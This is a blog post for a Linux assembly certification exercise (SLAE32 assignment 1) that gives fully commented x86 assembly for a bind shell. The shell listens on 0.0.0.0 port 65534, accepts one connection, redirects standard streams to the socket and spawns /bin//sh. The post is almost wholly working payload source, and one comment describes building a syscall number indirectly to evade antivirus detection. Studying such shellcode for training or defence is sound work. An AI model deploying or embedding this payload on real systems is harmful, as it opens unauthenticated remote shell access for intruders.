---
layout: post
title: SLAE32  Assignment 1 - bindshell
excerpt: asm code and comment for my bindshell
---

    ; name     : bindshell
    ; author     : Sandro "guly" Zaccarini SLAE-1037
    ; purpose    : this program will open a listening socket on 0.0.0.0, waits for 1 connection and spawn a shell
    ;            this code has been written for SLAE32 assignment 1
    ; references : https://syscalls.kernelgrok.com/ , /usr/include/linux/net.h , man socketcall
    ; license    : CC-BY-NC-SA
    ;
    ; high level flow:
    ; socket+setsockopt -> bind -> listen -> accept -> dup fd -> spawn /bin//sh
    
    global _start
    section .text
    
    ; reused functions are written on top to save some code in _start routine
    
    ; dummy function used to break easily on gdb while debugging, just rets without touching anything
    ; i used to place a call trap and recompile, while having a "b trap" on ~/.gdbinit
    trap:
    ret
    
    zero:
    ; zero eax and ebx by xoring against themself
    ; i don't really need to always zero both, but this code won't be that optimized so i went for the safeness
    xor eax,eax
    xor ebx,ebx
    ret
    
    socketcall2eax:
    ; place syscall code for socketcall in eax, which is 0x66, no need to zero because i use mov.
    ; i'm using add to avoid hardcoded 0x66 call, which could be trapped by some AV, when 0x33 is the call acct and looks harmless to me
    mov al,0x33
    add al,0x33
    ret
    
    _start:
    ; ----------------------------------------------------------------------------------------
    ; purpose     : create a socket
    ; references  : man socket
    ; description :
    ; socketcall is the syscall used to work with socket. i'm going to use this syscall to create, bind, listen, and accept connections.
    ; the very first thing i have to do, is to create the socket itself. by reading references, i see that she needs 3 registers:
    ; eax => syscall id 0x66 for socketcall, that will be the same for every socketcall call of course and that's why i created a function on top
    ; ebx => socket call id, that is 0x1 for socket creation
    ; ecx => pointer to socket args
    ;
    ; man socket shows me that socket's args are:
    ; domain   => AF_INET because i'm creating a inet socket, and is 0x2
    ; type     => tcp is referenced as STREAM, that is 0x1
    ; protocol => unneded here because there is no inner protocol, so i'll use 0x0
    
    ; start by zeroing eax,ebx. not really needed because registers are clean, but better safe than sorry
    call zero
    
    ; then, create ecx because i don't want to use mov, and a zeroed eax is perfect for the purpose
    ; arg will be pushed in reverse order with no hardcoded address: 0, 1, 2
    push eax
    inc eax
    push eax
    inc eax
    push eax
    
    ; because socketcall needs a pointer, i'm moving esp address to ecx
    mov ecx, esp
    
    ; prepare eax to hold the socketcall value as discussed before
    call socketcall2eax
    
    ; because ebx is 0, i can just inc to have it to 1 for socketcall to call socket (pun intended :) )
    inc ebx
    
    ; do the call and create socket
    int 0x80
    
    ; because syscall rets to eax, if everything's good, eax will hold socket file descriptor: save it to esi to have it safe for the whole run
    mov esi,eax
    
    ; ----------------------------------------------------------------------------------------
    ; purpose     : set SO_REUSEADDR
    ; references  : man setsockopt , man 7 socket , /usr/include/asm-generic/socket.h
    ; description :
    ; both during test and in real life, you have to be sure you can spawn again the shell on the same port whatever happens.
    ; setsockopt is used to set socket options, i'm using it to set SO_REUSEADDR that let me to spawn the same bindshell twice even in case of bad exit
    ; eax => syscall id 0x66 for socketcall
    ; ebx => setsockopt id 0xE taken from linux/net.h
    ; ecx => sockfd, level, optname, pointer to optval, optlen
    ;
    ; asm-generic/socket.h shows that SO_REUSEADDR values is 0x2
    
    ; preparing ecx at first, in reverse order of course
    ; optlen is 1, because i just have a int
    push 1
    ; address of optval here
    push esp
    ; SO_REUSEADDR id is 0x2, push the value
    push 2
    ; SOL_SOCKET will be 1, push again the value
    push 1
    ; push socket file descriptor, already saved to esi
    push esi
    
    ; place stack pointer in ecx
    mov ecx, esp
    
    ; put setsockopt id to ebx. because ebx has been zeroed, i can use bl
    mov bl,0xE
    
    ; prepare eax to hold the socketcall value as discussed
    call socketcall2eax
    
    ; do the actual call
    int 0x80
    ; i don't care for retcode, going to assume it's ok
    
    ; ----------------------------------------------------------------------------------------
    ; purpose     : bind socket to 0.0.0.0:bindport
    ; references  : man bind , man 7 ip
    ; description :
    ; a socket alone is useless if you don't bind and listen.
    ; i'm going to bind to 0.0.0.0 because i don't know the reachable ip address of the box. if i wanted to listen on a given address,
    ; i could've hardcoded it
    ; listen port is defined in .data section, var name is bindport and could be easily changed
    ; syscall needs the same args, just socketcall id will change:
    ; eax => syscall id 0x66 for socketcall
    ; ebx => bind call id, 0x2 taken from linux/net.h
    ; ecx => pointer to address struct
    ; 
    ; man bind shows me that args are:
    ; sockfd  => already saved in esi
    ; address => address struct defined by ip(7)
    ; addrlen => addrlen is 32bit (0x10)
    ; 
    ; man 7 ip shows address struct details, that will be placed in ecx. arguments are:
    ; family => AF_INET, so 0x2
    ; port   => held by bindport
    ; addr   => as said, 0x0 to listen to 0.0.0.0
    
    ; because setsockopt worked with registers, let's zero again to start from a known situation
    call zero
    
    ; push arg in reverse, so i can take advantage of eax being 0x0
    ; prepare stack pointer to addr struct defined in man 7 ip
    ; 0 to listen to ANY ADDR
    push eax
    ; push port to bind to, defined in .data. pushed as word
    push word bindport
    ; push AF_INET value as word again
    push word 0x2
    ; get stack pointer to ecx
    mov ecx,esp
    
    ; push bind arg, again in reverse order
    ; addrlen is fixed to 16, or 0x10
    push byte 0x10
    ; pointer to addr struct
    push ecx
    ; sockfd, saved before to esi
    push esi
    ; stack pointer to ecx again, to feed bind socketcall
    mov ecx,esp
    
    ; ebx has been zeroed, inc it twice to have 0x2 for bind()
    inc ebx
    inc ebx
    
    ; same call to have 0x66 to eax and do socketcall
    call socketcall2eax
    
    ; do the call
    int 0x80
    ; i'm ignoring retcode here too
    
    ; ----------------------------------------------------------------------------------------
    ; purpose     : actual listen on socket
    ; references  : man listen
    ; description : having the socket ready, i'm ask the system to listen. listen id, again took from linux/net.h, is 0x4.
    ; man listen says that i have to feed it with socket fd and backlog value
    ; eax => syscall id 0x66
    ; ebx => listen 0x4
    ; ecx => socket filedescriptor, backlog (will use 1 to limit to 1 connection)
    
    ; arg in reverse order to ecx
    ; because i don't have any register holding 0x1, i just push the word to have backlog set as 0x1
    push word 0x1
    ; and esi to push sockfd
    push esi
    ; feed listen call id. because ebx is 0x2, i could inc ebx twice. i'm using mov to change someway the flow
    mov bl, 0x4
    ; put in ecx esp pointer
    mov ecx, esp
    
    ; same call to have 0x66 to eax and do socketcall
    call socketcall2eax
    
    ; do the actual call
    int 0x80
    
    ; ----------------------------------------------------------------------------------------
    ; purpose     : accept connection on created socket
    ; references  : man 2 accept , man 7 ip
    ; description : having the socket in listen, she has now to accept a connection
    ; man accept says that i have to feed it with socket fd, pointer to struct addr, and addrlen
    ; struct addr has already been discussed before, but because addr and port are not needed here i'm just pushing 0x0
    ; eax => syscall id 0x66
    ; ebx => accept 0x5
    ; ecx => socket filedescriptor, pointer to addr, addrlen
    
    ; prepare arg for ecx as i did before
    ; gdb says that edx is 0x0, no surprise because nobody used it. using it to push two 0x0 for addr and port
    push edx
    push edx
    ; ending with socket fd
    push esi
    
    ; stack pointer to ecx for addr struct
    mov ecx,esp
    
    ; ebx is 0x4 and i need it to be 0x5, one inc will be enough
    inc bl
    
    ; usual call to have 0x66 to eax and do socketcall
    call socketcall2eax
    
    ; do the actual call
    int 0x80
    
    ; as soon as a client connects, eax will hold an id that refer to that client
    ; save clientid to edi, we need it very soon
    ; i also could've used dl and al because clientid will be a very small number
    mov edi,eax
    
    ; ----------------------------------------------------------------------------------------
    ; purpose     : create fd used by /bin//sh
    ; references  : man dup2
    ; description : every shell has three file descriptor: STDIN(0), STDOUT(1), STDERR(2)
    ; this code will create said fd
    ; eax => dup2 callid, that is 0x3f got from kernelgrok website
    ; ebx => clientid
    ; ecx => newfd id, said file descriptor
    ;
    ; i'm going to create them by looping using ecx, to save some instruction. ecx will start at 2, create fd, dec
    ; as soon as ecx is a negative number (SF is 1), the loop ends
    
    
    ; put 0x2 to cl to start creating STDERR just after dec
    ; because ecx has been used and it's not 0x0 while edx is null, i'm going to swap ecx and edx before
    ; i could also used 0x3 and jnz, by having int0x80 after the dec
    xchg ecx,edx
    mov cl,0x2
    
    ; copy socket fd to ebx to feed clientid
    mov ebx, edi
    
    ; zero eax and start the loop
    xor eax,eax
    dup2:
    ; dup2 call id
    mov al,0x3f
    
    ; dec ecx to have 2,1,0
    int 0x80
    dec ecx
    
    ; loop until ecx is 0x0, we then have 3 runs: with 2, 1, 0 values
    jns dup2
    
    ; ----------------------------------------------------------------------------------------
    ; purpose     : spawn /bin//sh
    ; references  : man execve
    ; description : put /bin//sh on the stack, aligned to 8 bytes to prevent 0x00 in the shellcode itself
    ; and null terminating it by pushing a zeroed register at first
    ; eax => execve call,0xB
    ; ebx => pointer to executed string, which will be /bin//sh null terminated
    ; ecx => args to executed command, that could be 0x0
    ; edx => pointer to environment, which could be 0x0
    
    ; i need to push a null byte to terminate the string, easiest way is to zero a reg and push it but i know ebp and eax should be 0x0 but i want to be sure
    call zero
    push eax
    push 0x68732f2f
    push 0x6e69622f
    ; here the stack will looks like a null terminated /bin/sh:
    ; /bin//sh\0\0\0\0\0\0\0\0
    
    ; and place pointer to ebx
    mov ebx,esp
    
    ; empty envp to edx
    push eax
    mov edx,esp
    
    ; empty args for my shell
    push eax
    mov ecx,esp
    
    ; execve syscall here, eax is 0x0 so i can work on al
    mov al,0xB
    
    ; and pop shell
    int 0x80
    
    ; neat exit because i like it
    xor eax,eax
    mov al,0x1
    int 0x80
    
    section .data
    ; 65534 converted in hex (0xFFFE), then little endian
    bindport equ 0xFEFF
    
    ; This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
